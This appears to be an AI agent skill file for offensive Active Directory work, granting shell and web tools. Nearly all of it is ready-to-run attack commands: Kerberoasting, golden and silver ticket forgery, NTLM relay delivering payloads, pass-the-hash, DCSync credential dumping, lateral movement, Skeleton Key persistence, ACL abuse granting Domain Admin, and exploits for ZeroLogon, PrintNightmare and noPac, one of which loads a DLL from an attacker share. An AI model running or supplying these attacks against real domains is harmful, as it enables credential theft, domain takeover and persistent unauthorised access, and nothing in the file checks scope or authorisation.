---
name: active-directory
description: Comprehensive Active Directory exploitation including enumeration, Kerberos attacks, lateral movement, and domain compromise techniques
allowed-tools: Bash, Read, Write, Grep, WebFetch
---

# Active Directory Skill

## Purpose
Provides advanced Active Directory exploitation techniques including enumeration, Kerberos attacks, credential harvesting, lateral movement, and domain escalation paths.

## AD Enumeration

### Initial Domain Reconnaissance
```bash
# Domain controller discovery
nslookup -type=SRV _ldap._tcp.dc._msdcs.{domain}
nmap -p 88,135,139,389,445,464,593,636,3268,3269 {dc_ip}

# Domain info via SMB
enum4linux -a {target}
rpcclient -U "" -N {target}

# LDAP enumeration
ldapsearch -x -h {dc_ip} -s base
ldapsearch -x -h {dc_ip} -b "DC=domain,DC=com"
```

### User Enumeration
```bash
# Via RPC
rpcclient -U "" -N {target} -c "enumdomusers"
rpcclient -U "" -N {target} -c "enumdomgroups"

# Via LDAP
ldapsearch -x -h {dc_ip} -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# Via Kerberos (user enumeration)
kerbrute userenum --dc {dc_ip} -d {domain} users.txt

# RID cycling
impacket-lookupsid {domain}/guest@{target} -no-pass
impacket-lookupsid {domain}/{user}:{password}@{target}
```

### Computer Enumeration
```bash
# List computers
ldapsearch -x -h {dc_ip} -b "DC=domain,DC=com" "(objectClass=computer)" name

# Via PowerView (from Windows)
Get-DomainComputer
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth
```

## BloodHound Collection and Analysis

### Data Collection
```bash
# Linux collection with Python
bloodhound-python -d {domain} -u {user} -p {password} -dc {dc_ip} -c all

# Windows collection with SharpHound
./SharpHound.exe -c all
./SharpHound.exe -c all -d {domain} --ldapusername {user} --ldappassword {password}

# Stealth collection
./SharpHound.exe -c DCOnly
./SharpHound.exe --stealth
```

### BloodHound Queries
```cypher
# Find shortest path to Domain Admin
MATCH (n:User),(m:Group {name:'DOMAIN ADMINS@DOMAIN.COM'}),p=shortestPath((n)-[*1..]->(m)) RETURN p

# Find all computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Find users with DCSync rights
MATCH (n:User)-[:DCSync]->(d:Domain) RETURN n

# Find Kerberoastable users
MATCH (n:User {hasspn:true}) RETURN n

# Find AS-REP roastable users
MATCH (n:User {dontreqpreauth:true}) RETURN n

# Find computers where Domain Users can RDP
MATCH (g:Group {name:'DOMAIN USERS@DOMAIN.COM'})-[:CanRDP]->(c:Computer) RETURN c

# Find shortest path from owned principals
MATCH (n {owned:true}),(m:Group {name:'DOMAIN ADMINS@DOMAIN.COM'}),p=shortestPath((n)-[*1..]->(m)) RETURN p
```

## Kerberos Attacks

### Kerberoasting (T1558.003)
```bash
# Get TGS tickets for SPNs
impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request
impacket-GetUserSPNs {domain}/{user} -hashes {lm:ntlm} -dc-ip {dc_ip} -outputfile kerberoast.txt

# Using Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerberoast.txt
Rubeus.exe kerberoast /user:{spn_user} /nowrap

# Crack with hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt
john --format=krb5tgs kerberoast.txt --wordlist=wordlist.txt
```

### AS-REP Roasting (T1558.004)
```bash
# Find users without Kerberos pre-auth
impacket-GetNPUsers {domain}/ -usersfile users.txt -dc-ip {dc_ip} -format hashcat
impacket-GetNPUsers {domain}/{user} -no-pass -dc-ip {dc_ip}

# Using Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack AS-REP hashes
hashcat -m 18200 asrep.txt wordlist.txt
john --format=krb5asrep asrep.txt --wordlist=wordlist.txt
```

### Golden Ticket (T1558.001)
```bash
# Get krbtgt hash (requires domain compromise)
secretsdump.py {domain}/{admin}@{dc_ip}
mimikatz # lsadump::dcsync /domain:{domain} /user:krbtgt

# Create golden ticket
impacket-ticketer -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator
impacket-getTGT -dc-ip {dc_ip} {domain}/Administrator -hashes :{krbtgt_hash}

# Using mimikatz
kerberos::golden /domain:{domain} /sid:{sid} /krbtgt:{hash} /user:Administrator /ptt
```

### Silver Ticket (T1558.002)
```bash
# Create silver ticket for specific service
impacket-ticketer -nthash {service_hash} -domain-sid {sid} -domain {domain} -spn cifs/{target} Administrator

# Using mimikatz
kerberos::golden /domain:{domain} /sid:{sid} /target:{target} /service:cifs /rc4:{hash} /user:Administrator /ptt
```

### Kerberos Delegation Attacks

#### Unconstrained Delegation
```bash
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Monitor for TGTs
Rubeus.exe monitor /interval:5 /nowrap

# Extract TGT from memory
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump /nowrap
```

#### Constrained Delegation
```bash
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# S4U abuse
Rubeus.exe s4u /user:{user} /rc4:{hash} /impersonateuser:Administrator /msdsspn:cifs/{target} /ptt
impacket-getST -spn cifs/{target} -impersonate Administrator {domain}/{user} -hashes :{hash}
```

## Credential Attacks

### NTLM Relay (T1557.001)
```bash
# Setup responder
responder -I eth0 -wv

# Setup ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldap://{dc_ip} --escalate-user {user}

# Relay to specific targets
ntlmrelayx.py -t smb://{target} -e payload.exe
ntlmrelayx.py -t http://{target}/endpoint -c "powershell -e {encoded_payload}"
```

### Pass-the-Hash (T1550.002)
```bash
# Using impacket
impacket-psexec {domain}/{user}@{target} -hashes {lm}:{ntlm}
impacket-smbexec {domain}/{user}@{target} -hashes :{ntlm}
impacket-wmiexec {domain}/{user}@{target} -hashes :{ntlm}

# Using CrackMapExec
crackmapexec smb {target} -u {user} -H {ntlm} --local-auth
crackmapexec smb {target} -u {user} -H {ntlm} -x "whoami"
```

### Pass-the-Ticket (T1550.003)
```bash
# Export tickets
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump /nowrap

# Import ticket
mimikatz # kerberos::ptt {ticket.kirbi}
Rubeus.exe ptt /ticket:{base64_ticket}

# Linux with impacket
export KRB5CCNAME=ticket.ccache
impacket-psexec {domain}/{user}@{target} -k -no-pass
```

### DCSync (T1003.006)
```bash
# Requirements: Replicating Directory Changes permissions

# Using secretsdump
secretsdump.py {domain}/{user}:{password}@{dc_ip}
secretsdump.py {domain}/{user}@{dc_ip} -hashes {lm}:{ntlm}

# Using mimikatz
lsadump::dcsync /domain:{domain} /all
lsadump::dcsync /domain:{domain} /user:krbtgt
lsadump::dcsync /domain:{domain} /user:Administrator

# Extract specific accounts
secretsdump.py {domain}/{user}@{dc_ip} -just-dc-user Administrator
```

## Lateral Movement

### PowerShell Remoting
```powershell
# Create PSSession
$cred = Get-Credential
New-PSSession -ComputerName {target} -Credential $cred
Enter-PSSession -ComputerName {target} -Credential $cred

# Execute commands
Invoke-Command -ComputerName {target} -ScriptBlock {whoami}
Invoke-Command -ComputerName {target} -FilePath script.ps1
```

### WMI Lateral Movement
```bash
# Using impacket
impacket-wmiexec {domain}/{user}:{password}@{target}
impacket-wmiexec {domain}/{user}@{target} -hashes :{ntlm}

# Using CrackMapExec
crackmapexec smb {target} -u {user} -p {password} --exec-method wmi -x "whoami"
```

### SMB Lateral Movement
```bash
# PSExec variants
impacket-psexec {domain}/{user}:{password}@{target}
impacket-smbexec {domain}/{user}:{password}@{target}
impacket-atexec {domain}/{user}:{password}@{target} "whoami"

# Service creation
sc \\{target} create {service} binpath= "cmd.exe /c {command}"
sc \\{target} start {service}
```

### DCOM Lateral Movement
```bash
# Using impacket
impacket-dcomexec {domain}/{user}:{password}@{target}

# MMC20.Application
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{target}"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c {command}","7")

# ShellWindows
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"{target}")
$obj = [System.Activator]::CreateInstance($com)
$obj.item().Document.Application.ShellExecute("cmd.exe","/c {command}","C:\Windows\System32",$null,0)
```

## Persistence Techniques

### AD Persistence
```bash
# AdminSDHolder modification
# Add user to AdminSDHolder ACL for automatic privilege restoration

# DCShadow
# Create rogue domain controller for persistence

# Skeleton Key
mimikatz # misc::skeleton

# Custom SSP
mimikatz # misc::memssp
```

### ACL Abuse
```powershell
# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity {user} -Rights DCSync

# Add user to group
Add-DomainGroupMember -Identity "Domain Admins" -Members {user}

# Reset password permission
Add-DomainObjectAcl -TargetIdentity {target_user} -PrincipalIdentity {attacker} -Rights ResetPassword
```

## Forest and Trust Exploitation

### Trust Enumeration
```bash
# List trusts
nltest /domain_trusts
Get-DomainTrust

# Trust direction and type
Get-DomainTrust -Domain {external_domain}
```

### Cross-Forest Attacks
```bash
# SID History injection (requires DA in child)
mimikatz # sid::patch
mimikatz # sid::add /sam:{user} /new:{enterprise_admin_sid}

# Trust ticket forgery
Rubeus.exe silver /service:krbtgt/{external_domain} /rc4:{trust_key} /sid:{current_sid} /sids:{enterprise_sid} /user:Administrator /nowrap
```

## ADCS (Certificate Services) Exploitation

### Certificate Template Enumeration
```bash
# Find vulnerable templates
certipy find -u {user}@{domain} -p {password} -dc-ip {dc_ip}

# Using Certify
Certify.exe find /vulnerable
```

### ESC1 - Template Allows SAN
```bash
# Request certificate with alternate SAN
certipy req -u {user}@{domain} -p {password} -target {ca} -template {vulnerable_template} -upn Administrator@{domain}

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip {dc_ip}
```

### ESC8 - NTLM Relay to ADCS
```bash
# Setup relay to CA web enrollment
ntlmrelayx.py -t http://{ca}/certsrv/certfnsh.asp --adcs --template DomainController
```

## Common AD Vulnerabilities (2025)

### ZeroLogon (CVE-2020-1472)
```bash
# Test for vulnerability
python zerologon_tester.py {dc_name} {dc_ip}

# Exploit (careful - can break DC)
python cve-2020-1472-exploit.py {dc_name} {dc_ip}
```

### PrintNightmare (CVE-2021-34527)
```bash
# Remote DLL load
rpcdump.py @{target} | grep -A2 MS-RPRN
python CVE-2021-34527.py {domain}/{user}:{password}@{target} '\\{attacker}\share\payload.dll'
```

### PetitPotam (CVE-2021-36942)
```bash
# Coerce authentication
python PetitPotam.py -u {user} -p {password} {listener_ip} {target_ip}
python PetitPotam.py {listener_ip} {target_ip}
```

### noPac (CVE-2021-42278/CVE-2021-42287)
```bash
# Exploit samAccountName spoofing
python noPac.py {domain}/{user}:{password} -dc-ip {dc_ip} -dc-host {dc_hostname}
```

## Best Practices

1. **Always run BloodHound first** for attack path analysis
2. **Test Kerberoasting early** - often successful
3. **Check for ASREP roastable accounts**
4. **Look for delegation misconfigurations**
5. **Enumerate AD CS if present**
6. **Monitor for honey tokens/accounts**
7. **Be careful with DC exploitation** - can cause outages

## Integration Notes

- Works with credential-harvesting skill for hash/password management
- Combines with windows-privesc for local privilege escalation
- Uses network-pivoting for multi-network AD environments
- Integrates with persistence-techniques for long-term access